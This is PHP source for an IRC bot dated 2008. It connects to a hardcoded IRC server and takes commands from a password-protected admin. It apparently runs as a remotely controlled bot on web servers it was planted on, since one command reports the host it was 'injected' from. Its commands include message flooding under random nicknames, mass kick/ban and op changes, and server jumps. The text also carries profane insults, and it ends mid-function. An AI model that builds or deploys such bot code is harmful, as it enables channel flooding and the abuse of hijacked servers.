<?php
/* 
+--------------------------------------------------------------------------- 
|   PHP-BOT v1.5 For Server aseanchat.net
|   ========================================================== 
|   by [kaMtiEz]
|   (c) 2008
|   Email: kaMtiEz@lovedead.com <-- aDd mE [Friendster] 
|   irc: #kudeta #tangerang #kamtiez QUakenet
|   ========================================================== 
|   
+--------------------------------------------------------------------------- 
*/ 

function cayank() {
$nicky=array(
"KiLL-100",
"KiLL-112",
"KiLL-123",
"KiLL-134",
"KiLL-165",
"KiLL-143",
"KiLL-166",
"KiLL-113",
"KiLL-156",
"KiLL-675",
"KiLL-444",
"KiLL-543",
"KiLL-153",
"KiLL-987",
"KiLL-564",
"KiLL-454",
"KiLL-333",
"KiLL-653",
"KiLL-168",
"KiLL-987",
"KiLL-777",
"KiLL-453",
"KiLL-875",
"KiLL-443",
"KiLL-542",
"KiLL-432",
"KiLL-126",
"KiLL-520",
"KiLL-000",
"KiLL-111",
"KiLL-222",
"KiLL-333",
"KiLL-444",
"KiLL-555",
"KiLL-666",
"KiLL-777",
"KiLL-888",
"KiLL-999",
"KiLL-921",
"KiLL-576",
"KiLL-10",
"KiLL-1",
"KiLL-2",
"KiLL-3",
"KiLL-4",
"KiLL-5",
"KiLL-6",
"KiLL-7",
"KiLL-8",
"KiLL-9",
"KiLL-11",
"KiLL-1112",
"KiLL-1113",
"KiLL-1114",
"KiLL-1115",
"KiLL-1116",
"KiLL-1117",
"KiLL-1118",
"KiLL-1119",
"KiLL-133",
"KiLL-155",
"KiLL-161",
"KiLL-188",
"KiLL-199",
"KiLL-421",
"KiLL-546",
"KiLL-887",
"KiLL-349",
"KiLL-879",
"KiLL-087",
"KiLL-456",
"KiLL-5533",
"KiLL-2222",
"KiLL-23134",
"KiLL-4556",
"KiLL-1245"
);
$identlist = array(
"yasea",
"kudeta",
"tangerang",
"kamtiez",
"bugs",
"pekri",
"jhun",
"kayla",
"wisnoe",
"aroem",
"yulan",
"mella",
"wina",
"sincan",
"agus",
"cinta",
"rehe",
"eten",
"tedz",
"black",
"amel",
"ciplut",
"nciplut",
"yoshevina",
"Coracore",
"fuck",
"mirdong",
"cable",
"helen"
);
$tsu1=array("`","|","[","]","{","}","^","_");
$tsu2=array("`","|","[","]","{","}","^","-","\\","_");
$tsumsg = " 0,4|  0,2 8KaMtiEz  4  0,4C  4,8rew 0,4|  0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4|  0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4| ";//400 Karakter

///***Seting Admin & Bot Ident***///
$nick = $nicky[rand(0,count($nicky) - 1)];
$awaymsg = " 1-=[=[ 4 Kill-9 Crew team  1]=]=- ";
$identify = '';
$Admin = 'ZeroBoss';
$BOT_PASSWORD = 'greg';
$channels = '#steam';
$remotehst2= array("64.106.143.81");
$remotehost= $remotehst2[rand(0,count($remotehst2) - 1)];
$port = '6667';
$realname = " 1-==[ 4kiLL-9 CreWz  1]==- ";
$counterfp = 0;
$channels = str_replace("CNL","#",$channels);
print "<body bgcolor=#000000 text=#C0C0C0>";
print "<b>== Connecting to $remotehost...</b>";


$raway = "on";
$log   = "off";
$saway = "1";
if (!$stime) { $stime = time(); }
if (!$port) { $port = "6666"; }
$Admin = strtolower($Admin);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Admin"));

$username = $identlist[rand(0,count($identlist) - 1)];
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);
define ('CRL', "\r\n");
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  if(!$fp) {
        if ( $counterfp <= 200 ) {
                $counterfp = $counterfp+1;
                working($nick);
        }
          else { 
            print "<br><b>Cannot Koneksi Ke $remotehost!<br>ulangi servel liyane</b>";
            $keluar = 1;
             exit;
        }
  }
  print "<br><b>== Koneksi Berhasil</b>";
  $Header = 'NICK '.$nick . CRL;
  $Header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $Header);
  $response = '';
  while (!feof($fp)) {
        $response .= fgets($fp, 1024);
        while (substr_count($response,CRL) != 0) {
                $offset = strpos($response, CRL);
                $data = substr($response,0,$offset);
                $response = substr($response,$offset+2);
                if (substr($data,0,1) == ':') {
                        $offsetA = strpos($data, ' ');
                        $dFrom = substr($data,1,$offsetA-1);
                        $offsetB = strpos($data, ' :');
                        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
                        $offsetC = strpos($data, '!');
                        $dNick = substr($data,1,$offsetC-1);
                        $iText = substr($data,$offsetB+2);
            if ( substr($dCommand,0,3) == '004' ) {
                          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
                          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
                          fputs($fp, 'NOTICE ' . $Admin . ' :Halo BoZz!!!!!' .  CRL);
                          fputs($fp, base64_decode("").CRL);
                          foreach ($channel as $v) {
                                fputs($fp, 'JOIN ' .$v . CRL);
                          }
                          $pong1 = '1';
            }
                        elseif (substr($dCommand,0,3)=='465') {
                                print "<br><b>== Bot iki wes dipateni.</b>";
                                $akill = 2;
                        }
                        elseif (substr($dCommand,0,3)=='433') {
                                $nick = $nicky[rand(0,count($nicky) - 1)];
                                fputs($fp, 'NICK '.$nick . CRL);
                        }
                        elseif (substr($dCommand,0,3)=='432') {
                                $nick = $nick.$username;
                                fputs($fp, 'NICK '.$nick . CRL);
                        }
                        if (eregi('.dal.net',$dNick) && $akill==2) {
                                if (eregi('AKILL ID:',$data) || eregi('Your hostmask is',$data) || eregi('Your IP is',$data)) {
                                        print "<br><b>".strstr($data,'***')." </b>";

                                        if (eregi('Your IP is',$data)) {
                                                $keluar = 1;
                                                exit;
                                        }
                                }
                        }
                        $dcom = explode(" ", $dCommand);
                        $dNick = strtolower($dNick);
                        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
                                fputs($fp, 'JOIN ' .$dcom[1]. CRL);
                        }
                        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
                                if ($auth["$dNick"]) {
                                        if ($auth["$dNick"]["pass"]) {
                                                if ($auth["$dNick"]["auth"]==2) {

                                                        if ($dcom[0]=='NICK') {
                                                                $com = explode(" ", $data);
                                                                $chnick = strtolower(str_replace(':','',$com[2]));
                                                                if ($dNick!=$chnick) {
                                                                        $auth["$dNick"]["auth"] = 1;
                                                                        fputs($fp,'NOTICE '.$chnick.' :ngloco tha Bozz?! ' . CRL);
                                                                }
                                                        } else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :arep coly tha Juragan??! ' . CRL); }
                                                }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :pass your pass ' . CRL); }
                                }
                        }
                        elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
                                $dcom[2] = strtolower($dcom[2]);
                                if ($auth["$dcom[2]"]) {
                                        if ($auth["$dcom[2]"]["pass"]) {
                                                if ($auth["$dcom[2]"]["auth"]==1) {
                                                        $auth["$dcom[2]"]["auth"] = 2; $whois = "";
                                                        fputs($fp,'NOTICE ' . $dcom[2] . ' :Pasword '.$auth["$dcom[2]"]["status"].' ganteng raimu guk ' . CRL);
                                                } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Bozz ancene koyo kirik ' . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :JAncok passmu durung di set! ketiken: pass <pass mu> iki mek pertama kali thok, terus auth`o maneh ' . CRL); }
                                } else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Nick Bozz Tidak Di Temukan Tolong Ganti Nick Dan Auth Lagi ' . CRL); }
                        }
                        elseif ($dcom[0]=='NOTICE') {
                                $com = explode(" ", $data);
                                if ($com[3]==': KB' && $com[4] && $com[5] && $com[6]) {
                                        $msg = str_replace(' ','',$data);
                                        $msg = strstr($msg,":KB");
                                        $msg = str_replace(":KB $com[4]","",$msg);
                                        fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
                                        fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
                                }
                        }
                        elseif ($dcom[0]=='PRIVMSG') {
                                $com = explode(" ", $data);
                                if ($com[3]==': VERSION ') {
                                        fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION yasea BANGSAT v2008 Script By  0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4| '.chr(1) . CRL);
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
                                        if ($auth["$dNick"]) {
                                                if ($auth["$dNick"]["pass"]) {
                                                        if ($auth["$dNick"]["auth"]==1) {
                                                                if ($com[4]===$auth["$dNick"]["pass"]) {
                                                                        $auth["$dNick"]["auth"] = 2;
                                                                        fputs($fp,'NOTICE ' . $dNick . ' :shallom '.$auth["$dNick"]["status"].' juraganku! ' . CRL);
                                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :password ngisruh! auth sing genah JANCOK! ' . CRL); }
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :neh iki baru seps! ' . CRL); }
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :JAncok passmu durung di set! ketiken: pass <pass anda> iki mek pertama kali thok, terus auth`o maneh ' . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :Nick Bozz Tidak Di Temukan Tolong Ganti Nick Dan Auth Lagi ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
                                        if ($auth["$dNick"]) {
                                                if ($auth["$dNick"]["pass"]) {
                                                        if ($auth["$dNick"]["auth"]==2) {
                                                                $auth["$dNick"]["auth"] = 1;
                                                                fputs($fp,'NOTICE ' . $dNick . ' :minggato! ' . CRL);
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :koen wes minggat! ' . CRL); }
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :JAncok passmu durung di set, ! ketiken: pass <passmu> iki mek pertama kali thok, terus auth`o maneh ' . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :Username ga ketemu! ganti nickmu seng maeng terus auth maneh ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
                                        if ($auth["$dNick"]) {
                                                if (!$auth["$dNick"]["pass"]) {
                                                        $auth["$dNick"]["pass"] = $com[4];
                                                        $auth["$dNick"]["auth"] = 1;
                                                        fputs($fp,'NOTICE ' . $dNick . ' :pass anyarmu di set dadi '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :Pass wes siap! ketik: auth <your pass> ben aku percoyo ' . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :Username ga ketemu! ganti nickmu seng maeng terus auth maneh ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
                                        if ($auth["$dNick"]) {
                                                if ($auth["$dNick"]["auth"]==2) {
                                                        if ($com[4]===$auth["$dNick"]["pass"]) {
                                                                $auth["$dNick"]["pass"] = $com[5];
                                                                fputs($fp,'NOTICE ' . $dNick . ' :pass anyarmu di set dadi '.$auth["$dNick"]["pass"].', ketik: auth <your pass> ben aku percoyo! ' . CRL);
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :pass lawasmu salah! ketik: chgpass <pass lawas> <pass anyar> gawe ganti passmu ' . CRL); }
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :Username ga ketemu! ganti nickmu seng maeng terus auth maneh ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':angkat' && $com[4] && $com[4]!=$nick && $com[5]) {
                                        $com[4] = strtolower($com[4]);
                                        if ($auth["$dNick"]["auth"]==2) {
                                                if ($auth["$dNick"]["status"]=="Admin") {
                                                        if ($com[5]=="master" || $com[5]=="user") {
                                                                $auth["$com[4]"]["name"] = $com[4];
                                                                $auth["$com[4]"]["status"] = $com[5];
                                                                fputs($fp,'NOTICE ' . $dNick . ' :angkat :'.$com[4].' As My '.$com[5] . CRL);
                                                                fputs($fp,'NOTICE ' . $com[4] . ' :koen saiki tuanku '.$com[5].' dikongkoen '.$dNick.' ketiken: pass <your pass> ben ngset passmu ' . CRL);
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :salah perintah! ketik ae: angkat <nick> <master/user> ' . CRL); }
                                                } elseif ($auth["$dNick"]["status"]=="master") {
                                                        if (!$auth["$com[4]"]) {
                                                                if ($com[5]=="user") {
                                                                        $auth["$com[4]"]["name"] = $com[4];
                                                                        $auth["$com[4]"]["status"] = $com[5];
                                                                        fputs($fp,'NOTICE ' . $dNick . ' :angkat :'.$com[4].' As My '.$com[5] . CRL);
                                                                        fputs($fp,'NOTICE ' . $com[4] . ' :koen saiki tuanku '.$com[5].' dikongkoen '.$dNick.' ketiken: pass <your pass33] <Spyderur Pass ' . CRL);
                                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :salah perintah! ketik: angkat <nick> user ' . CRL); }
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :anggota wes ono! ga iso angkat! ' . CRL); }
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :auth sek COK! ketik: auth <your pass> ben afdhol ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"] && $com[3]==':pecat' && $com[4]) {
                                        $com[4] = strtolower($com[4]);
                                        if ($auth["$dNick"]["auth"]==2) {
                                                if ($auth["$dNick"]["status"]=="Admin") {
                                                        if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                                                                unset($auth["$com[4]"]);
                                                                fputs($fp,'NOTICE ' . $dNick . ' :pecat :'.$com[4].' teko daftar klan ' . CRL);
                                                                fputs($fp,'NOTICE ' . $com[4] . ' :koen koyok kontol wes koen dipecat '.$dNick . CRL);
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :salah JANCOK! ketik: pecat <nick> ' . CRL); }
                                                } elseif ($auth["$dNick"]["status"]=="master") {
                                                        if ($auth["$com[4]"]["status"]=="user") {
                                                                unset($auth["$com[4]"]);
                                                                fputs($fp,'NOTICE ' . $dNick . ' :pecat :'.$com[4].' teko daftar klan ' . CRL);
                                                                fputs($fp,'NOTICE ' . $com[4] . ' :koen koyok kontol wes koen dipecat '.$dNick . CRL);
                                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :salah JANCOK! ketik: pecat <nick> ' . CRL); }
                                                } else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
                                        } else { fputs($fp,'NOTICE ' . $dNick . ' :auth sek COK! ketik: auth <your pass> ben mantep ' . CRL); }
                                }
                                elseif ($auth["$dNick"]["status"]) {
                                if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
                                        $chan = strstr($dCommand,"#");
                                        $anick = str_replace("PRIVMSG ","",$dCommand);
                                        if ($com[3]==':!auth') {
                                                if ($auth["$dNick"]["auth"]==2) {
                                                        fputs($fp,'NOTICE '.$dNick.' :WB GUGUK KLAN!' . CRL);
                                                } else {
                                                        $whois = $dNick;
                                                        fputs($fp,'WHOIS '.$dNick . CRL);
                                                }
                                        } elseif ($com[3]==':`auth' && $chan) {
                                                if ($auth["$dNick"]["auth"]==2) {
                                                        fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' siap juragan JAncok!' . CRL);
                                                } else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' JANCOK SOPO KOEN!' . CRL); }
                                        } elseif ($auth["$dNick"]["auth"]==2) {
                                                if ($com[3]==':`ngoceh' && $com[4] && $chan) {
                                                        $msg = strstr($data,":`ngoceh");
                                                        $msg = str_replace(":`ngoceh ","",$msg);
                                                        fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
                                                }
                                                elseif ($com[3]==':`bid' && $com[4] && $chan) {
                                                        $msg = strstr($data,":`bid");
                                                        $msg = str_replace(":`bid ","",$msg);
                                                        fputs($fp,'PRIVMSG '.$chan.' : ACTION '.$msg.' '. CRL);
                                                }
                                                elseif ($com[3]==':`entot' && $com[4] && $chan) {
                                                        fputs($fp,'PRIVMSG '.$chan.' : ACTION slaps '.$com[4].' entot raimu karo suspensi genjotan tapir :P~~~~ '. CRL);
                                                }
                                                elseif ($com[3]==':`serbu' && $com[4] && $com[5]) {
                                                        $msg = strstr($data,":`serbu");
                                                        $msg = str_replace(":`serbu $com[4] ","",$msg);
                                                        fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
                                                }
                                                elseif ($com[3]==':`sembur' && $com[4] && $com[5]) {
                                                        $msg = strstr($data,":`sembur");
                                                        $msg = str_replace(":`sembur $com[4] ","",$msg);
                                                        fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
                                                }
                                                elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                                                        $msg = strstr($data,":`ctcp");
                                                        $msg = str_replace(":`ctcp $com[4] ","",$msg);
                                                        fputs($fp,'PRIVMSG '.$com[4].' : '.$msg.' '. CRL);
                                                }
                                                elseif ($com[3]==':`ping' && $chan) {
                                                        $sml = $smile[rand(0,count($smile) - 1)];
                                                        fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.',  0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4|  '.$sml. CRL);
                                                }
                                                elseif ($com[3]==':`pong' && $chan) {
                                                        $sml = $smile[rand(0,count($smile) - 1)];
                                                        fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.',  PING!  '.$sml. CRL);
                                                }
                                                elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                                                        $bhost = $_SERVER['HTTP_HOST'];
                                                        $bphp  = $_SERVER['PHP_SELF'];
                                                        fputs($fp,'NOTICE '.$dNick.' :`jejeg <n>=kick|`serbu <n>= pV|`sembur <n>=notice|`iklan (n)=tsunami|`ngoceh=say|`bid = act|`ganti=ganti nick|`ping|`entot|aku diinjek dr: '.$bhost.', Bot PHP: '.$bphp. CRL);
                                                }
                                                elseif ($com[3]==':`up' && $chan) {
                                                        fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
                                                }
                                                elseif ($com[3]==':`down' && $chan) {
                                                        fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
                                                }
                                                elseif ($com[3]==':`iklan' && $com[4] && $auth["$dNick"]["status"]!="user") {
                                                        $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                                                        fputs($fp, 'NICK '.$nicktsu . CRL);
                                                        if (substr($dCommand,0,3)=='433') {
                                                                $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                                                                fputs($fp, 'NICK '.$nicktsu . CRL);
                                                        }
                                                        $msg = strstr($data,":`iklan");
                                                        $msg = str_replace(":`iklan $com[4]","",$msg);
                                                        if (ereg("#", $com[4])) {
                                                             fputs($fp, 'JOIN '.$com[4] . CRL);
                                                        }
                                                        fputs($fp, 'PRIVMSG '.$com[4].' : '.$msg.' 0,1|  0,11 4forbid  4  0,5C  8,4rew 0,3|' . CRL);
                                                        fputs($fp, 'NOTICE '.$com[4].' : '.$msg.' 0,1|  0,11 4forbid  4  0,5C  8,4rew 0,3|' . CRL);
                                                        fputs($fp, 'PRIVMSG '.$com[4].' : TSUNAMI  '.$msg.' 0,1|  0,11 4KiR1K  4  0,5C  8,4rew 0,3| 0,1|  0,11 4KiR1K  4  0,5C  8,4rew 0,3|' . CRL);
                                                        fputs($fp, 'PRIVMSG '.$com[4].' : '.$msg.' 0,3|  0,3 8KiR1K  4  0,5C  8,4rew 0,3| 0,3|  0,3 8KiR1K  4  0,5C  8,4rew 0,3|' . CRL);
                                                        fputs($fp, 'NOTICE '.$com[4].' : '.$msg.' 0,4|  0,6 8KiR1K  4  0,5C  4,8rew 0,3| 0,4|  0,6 8KiR1K  4  0,5C  4,8rew 0,3|' . CRL);
                                                        fputs($fp, 'PRIVMSG '.$com[4].' : FLOOD  '.$msg.' 0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4| 0,4|  0,2 8KiR1K  4  0,4C  4,8rew 0,4|' . CRL);
                                                        if (ereg("#", $com[4])) {
                                                             fputs($fp, 'PART '.$com[4].' :Complete' . CRL);
                                                          fputs($fp, 'NICK '.$nick . CRL);
                                                        } else {
                                                        fputs($fp, 'NICK '.$nick . CRL);
                                                        }
                                                }
                                                elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                                                        $msg = strstr($data,":`cycle");
                                                        if (ereg("#", $com[4])) {
                                                             $partchan = $com[4];
                                                          $msg = str_replace(":`cycle $com[4]","",$msg);
                                                        } else {
                                                             $partchan = $chan;
                                                          $msg = str_replace(":`cycle","",$msg);
                                                        }
                                                        if (strlen($msg)<3) {
                                                          $msg = '';
                                                        }
                                                        fputs($fp, 'PART '.$partchan.' : '.$msg . CRL);
                                                        fputs($fp, 'JOIN '.$partchan . CRL);
                                                }
                                                elseif ($com[3]==':`minggat' && $auth["$dNick"]["status"]=="Admin") {
                                                        $msg = strstr($data,":`part");
                                                        if (ereg("#", $com[4])) {
                                                             $partchan = $com[4];
                                                          $msg = str_replace(":`minggat $com[4]","",$msg);
                                                        } else {
                                                             $partchan = $chan;
                                                          $msg = str_replace(":`minggat","",$msg);
                                                        }
                                                        if (strlen($msg)<3) {
                                                          $msg = '';
                                                        }
                                                        fputs($fp, 'PART '.$partchan.' : '.$msg . CRL);
                                                        $remchan = strtolower($partchan);
                                                        if (in_array($remchan, $channel)) {
                                                                $channels = str_replace("$remchan ","",$channels);
                                                                unset($channel);
                                                                $channel = explode(" ", $channels);
                                                        }

                                                        foreach ($channel as $v) {
                                                                fputs($fp, 'JOIN '.$v . CRL);
                                                        }
                                                }
                                                elseif ($com[3]==':`melbu' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                                                        if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                                                        $addchan = strtolower($com[4]);
                                                        if (!in_array($addchan, $channel)) {
                                                                $channel[]=$addchan;
                                                                $channels.="$addchan ";
                                                        }
                                                        foreach ($channel as $v) {
                                                                sleep(rand(1,6));
                                                                fputs($fp, 'JOIN '.$v . CRL);
                                                        }
                                                }
                                                elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                                                        $nick = $com[4];
                                                        $identify = $com[5];
                                                        fputs($fp, 'NICK '.$nick . CRL);
                                                             fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
                                                }
                                                elseif ($com[3]==':`jejeg' && $com[4] && $chan) {
                                                        $msg = strstr($data,":`jejeg");
                                                        $msg = str_replace(":`jejeg $com[4]","",$msg);
                                                        fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                                                }
                                                elseif ($com[3]==':`usir' && $com[4] && $chan) {
                                                        $msg = strstr($data,":`usir");
                                                        $msg = str_replace(":`usir $com[4]","",$msg);
                                                        fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                                                        fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
                                                }
                                                elseif ($com[3]==':`ganti') {
                                                        $nick = $nicky[rand(0,count($nicky) - 1)];
                                                        fputs($fp, 'NICK '.$nick . CRL);
                                                        if (substr($dCommand,0,3)=='433') {
                                                                $nick = $nicky[rand(0,count($nicky) - 1)];
                                                                fputs($fp, 'NICK '.$nick . CRL);
                                                        }
                                                }
                                                elseif ($com[3]==':`op' && $chan) {
                                                        if ($com[4]) { $opnick = $com[4]; }
                                                        else { $opnick = $dNick; }
                                                        fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
                                                }
                                                elseif ($com[3]==':`deop' && $chan) {
                                                        if ($com[4]) { $opnick = $com[4]; }
                                                        else { $opnick = $dNick; }
                                                        fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
                                                }
                                                elseif ($com[3]==':`v' && $chan) {
                                                        if ($com[4]) { $vonick = $com[4]; }
                                                        else { $vonick = $dNick; }
                                                        fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
                                                }
                                                elseif ($com[3]==':`bisu' && $chan) {
                                                        if ($com[4]) { $vonick = $com[4]; }
                                                        else { $vonick = $dNick; }
                                                        fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
                                                }
                                                elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                                                        $msg = strstr($data,":`awaymsg");
                                                        $msg = str_replace(":`awaymsg","",$msg);
                                                        if (strlen($msg)<3) {
                                                          $raway="on";
                                                          fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                                                        } else {
                                                          $raway="off";
                                                          fputs($fp,'AWAY : ' . $msg . CRL);
                                                        }
                                                }
                                                elseif ($com[3]==':`mode' && $com[4] && $chan) {
                                                        fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
                                                }
                                                elseif ($com[3]==':`nickmode' && $com[4]) {
                                                        $nickmode = $com[4];
                                                        fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
                                                }
                                                elseif ($com[3]==':`chanlist') {
                                                        fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
                                                }
                                                elseif ($com[3]==':`userlist') {
                                                        $userlist="";
                                                        foreach ($auth as $user) {
                                                          if ($user["pass"]) { $pass="-pass ok"; }
                                                          else { $pass="-no pass"; }
                                                          $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                                                        }
                                                        fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
                                                }
                                                elseif ($com[3]==':`pateni' && $auth["$dNick"]["status"]=="Admin") {
                                                        $msg = strstr($data,":`pateni");
                                                        $msg = str_replace(":`pateni","",$msg);
                                                        if (strlen($msg)>3) {
                                                          $msg = str_replace(" ","_",$msg);
                                                        }
                                                        $quit1 = array("ngantor","nguantuk","sama","brb","bye_all","s33_you","excess_flood","pingtimeout","hehe","bye","mandi","makan","muuah","quit","conection_reset_bay_peer","banned","part","leaving","ada_deh","call_me","wew","no_komen","restart");
                                                        $quitmsg = $quit1[rand(0,count($quit1) - 1)];
                                                        fputs($fp, 'QUIT ' . $quitmsg . CRL);
                                                        $keluar = 1;
                                                        exit;
                                                }
                                                elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                                                        if ($com[4]) { $localhost = $com[4]; }
                                                        else { $localhost = 'localhost'; }
                                                        $keluar = 0;
                                                        fputs($fp, 'QUIT ' . CRL);
                                                }
                                                elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                                                        if (!eregi(".allindo.biz",$com[4])) {
                                                          $remotehost = "irc.dal.net";
                                                        } else { $remotehost = $com[4]; }
                                                        $keluar = 0;
                                                        fputs($fp, 'QUIT changging_server' . CRL);
                                                }
                                                elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                                                        if (!$com[4]) {
                                                          $username = $username;
                                                        } else { $username = $com[4]; }
                                                        $keluar = 0;
                                                        fputs($fp, 'QUIT ganti_ident' . CRL);
                                                }
                                                elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                                                        if (!$com[4]) {
                                                          $realname = "--";
                                                        } else { $realname = $com[4]; }
                                                        $keluar = 0;
                                                        fputs($fp, 'QUIT ganti_fullname' . CRL);
                                                }
                                                elseif ($com[3]==':`topic' && $com[4] && $chan) {
                                                        $msg = strstr($data,":`topic");
                                                        $msg = str_replace(":`topic ","",$msg);
                                                        fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
                                                }
                                                elseif ($com[3]==':!help' && !$chan) {
                                                        fputs($fp,'PRIVMSG '.$dNick.' :Secret Help' . CRL);
                                                }
